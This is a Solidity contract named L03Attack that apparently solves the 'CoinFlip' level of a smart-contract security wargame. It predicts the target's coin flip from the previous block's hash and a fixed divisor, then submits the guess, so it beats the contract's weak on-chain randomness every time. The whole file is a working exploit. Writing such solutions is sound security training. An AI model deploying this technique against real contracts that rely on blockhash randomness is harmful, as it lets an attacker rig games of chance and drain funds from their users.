// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { CoinFlip } from "./Level03.sol";

contract L03Attack {
    uint256 constant FACTOR =
        57_896_044_618_658_097_711_785_492_504_343_953_926_634_992_332_820_282_019_728_792_003_956_564_819_968;
    CoinFlip instance;

    constructor(CoinFlip _instance) {
        instance = _instance;
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        instance.flip(blockValue / FACTOR == 1);
    }
}
